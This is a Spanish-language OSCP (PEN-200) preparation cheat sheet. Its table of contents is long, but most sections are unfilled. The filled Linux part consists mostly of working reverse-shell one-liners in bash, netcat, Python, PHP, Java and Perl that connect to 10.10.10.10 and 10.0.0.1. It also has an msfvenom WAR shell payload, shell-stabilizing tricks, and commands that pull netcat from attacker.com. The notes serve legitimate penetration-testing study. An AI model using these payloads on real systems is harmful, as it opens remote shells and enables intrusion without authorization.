# Notas de preparación para el OSCP 

**Año : 2021**

![oscp](https://blog.nivel4.com/wp-content/uploads/2019/01/try-harder.png)

**Curso: Penetration Testing with Kali Linux (PEN-200)**

## Contenido
- [General](#General)
  - [Information Ghatering](#Information-Ghatering)
    - [Port Scanning](#Port-Scanning)
    - 
  - [Pentesting Web](#Pentesting-Web)
    - [Webshells](#Webshells)
    - [LFI](#LFI)
    - [LFI TO RCE](#LFI-TO-RCE)
    - [RFI](#RFI)
    - [Wordpress](#Wordpress)
      - [Encontrando plugins]
      - [xmlrpc goes wild]
    - [Shellshock](#Shellshock)
    - [JWT](#JWT)
      - [WEAK SECRET](#WEAK-SECRET)
      - [PUBLIC KEY](#PUBLIC-key)
    - [SQLi]
  - [Crackeando hashes]
    - [Hashcat](#Hashcat)
    - [John the Ripper](#John-the-Ripper)
    - [Aplicando Reglas (ver delivery)](#Aplicando-Reglas)
  - [Port Forwarding/ Port Tunneling](#Port-Forwarding)
    - [Chisel](#Chisel)
    - [Plink](#Plink)
    - [Ncat](#Ncat)
    - [SSH](#SSH)
    - [Metasploit](#Metasploit)
- [Linux](#Linux)  
  - [Reverse shells](#Reverse-shells) 
    - [Bash](#Bash)
    - [Netcat](#Netcat)   
    - [Python](#Python)
    - [PHP](#PHP)
    - [Java](#Java)
    - [Perl](#Perl)
    - [War msfvenom (tomcat manager)](#War)
    - [Groovy (Jenkins console)](#Groovy-(Jenkins-Console))
  - [Spawneando una shell mejor](#Spawning-a-TTY-shell)   
  - [Privilege Escalation](#Privilege-Escalation) 
  - [Escapando de Docker](#Escapando-de-Docker)
    - [Forma 1 ver ready]
    - [Forma 2 ver feline]
    - [Forma 3 ver tnb]
    - [Forma 4 ver final de reddish]
  - [Transferencia de Archivos](#Transfiriendo-Archivos)
    - [HTTP](#HTTP)
      - [Python](#Python_t)
      - [Python3](#Python3)
      - [Apache](#Apache)
      - [Php](#PHP_t)
    - [Curl](#Curl)
    - [Wget](#Wget)
    - [NetCat](#NetCat_t)
    - [/dev/tcp/](#Dev-tcp)
    - [FTP](#FTP)
    - [SCP](#SCP)
    - [Samba](#Samba)
  - [Bypassing de restricciones al inyectar comandos](#Bypassing-de-restricciones-al-inyectar-comandos)
  - [Bypassing restricted shells (rbash , rzsh,etc)](#Bypassing-restricted-shells-(rbash,rzsh,etc))    
- [Windows](#Windows)
- 
- [Reverse Shell]

Linux 
=========================================
Técnicas para utilizar en sistemas basados en unix

### Reverse shells

[Reverse shell generator](https://www.revshells.com/)

### Reverse shell comúnes
#### Bash
  ```bash
  bash -i >& /dev/tcp/10.10.10.10/9001 0>&1 
  ```
#### Netcat 
  ```bash
  nc -e /bin/bash 10.10.10.10 9001
  nc -e /bin/sh 10.10.10.10 9001
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
  ```
  
#### Python
  ```bash
  export RHOST="10.10.10.10";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
  
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
  ```
#### PHP 
  ```bash
  php -r '$sock=fsockopen("10.10.10.10",9001);exec("bash <&3 >&3 2>&3");'
  php -r '$sock=fsockopen("10.10.10.10",9001);shell_exec("bash <&3 >&3 2>&3");'
  php -r '$sock=fsockopen("10.10.10.10",9001);system("bash <&3 >&3 2>&3");'
  php -r '$sock=fsockopen("10.10.10.10",9001);passthru("bash <&3 >&3 2>&3");'
  Laudanum common reverse shell /usr/share/webshells/laudanum/php/php-reverse-shell.php
  ```
#### War
  ```bash
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
  ```
#### Java
  ```bash
  r = Runtime.getRuntime()
  p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
  p.waitFor()
  ```
#### Groovy (Jenkins Console)

  ```bash
  cmd = """ whoami """
  println cmd.execute().text
  ```
#### Perl
  ```bash
  perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  ```
 
### Spawning a TTY shell
  ```bash 
      python3 -c 'import pty;pty.spawn("/bin/bash")' 
      script /dev/null -c bash 
      \[ctrl+z] 
      stty raw -echo
      fg
    ## Usando rlwrap & script
      rlwrap nc -nlvp 443
      /usr/bin/script -qc /bin/bash /dev/null
    ## Usando socat
      parrot~> socat file:`tty`,raw,echo=0 tcp-listen:4444
      target~> socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
    ## Exportando variables para poder tener una shell full interactiva
      export TERM=xterm-256color
      export SHELL=bash
      alias ll='ls -lsaht –color=auto'
  ```
## Transfiriendo archivos

### HTTP
#### Python_t
  ```bash
  python -m SimpleHTTPServer 80
  ```
#### Python3
  ```bash
  python3 -m http.server 80
  ```
#### Apache
  ```bash
  sudo service start apache2
  sudo systemctl apache2 start
  ```
#### PHP_t
  ```bash
  php -S 0.0.0.0:8080
  ```
### Curl
  ```bash
  curl -O http://attacker.com/nc
  ```
### Wget
  ```bash
  wget http://attacker.com/nc # current directory
  wget http://attacker.com/nc -O /dev/shm/nc # Setting output path
  ```
### NetCat_t
  ```bash
  target -> nc -lvp 4444 > FileToTransfer
  source -> nc targetip 4444 -w 3 < FileToTransfer (w representa un tiempo de espera en seg para archivos muy grandes)
  ```
### Dev tcp
  ```bash
  target -> nc -lvp 4444 > FileToTransfer
  source cat FileToTransfer > /dev/tcp/targetip/4444 
  
  ## Forma 2 
  source nc -nlvp 444 > nc 
  target cat > nc < /dev/tcp/targetip/4444
  
  ```
### FTP
  ```bash
  pip3 install pyftpdlib
  source -> python3 -m pyftpdlib -p 21 -u chan -P 123
  target -> ftp sourceip # pw : 123  
  ```
### SCP
  ```bash
  source -> scp file.txt user@10.10.10.10:/tmp
  target -> cat /tmp/file.txt
  ```
### Samba
  ```bash
  source -> sudo impacket-smbserver share $(pwd) -user chan -password
  target -> smbclient //sourceip/share -U chan%chan
  ```
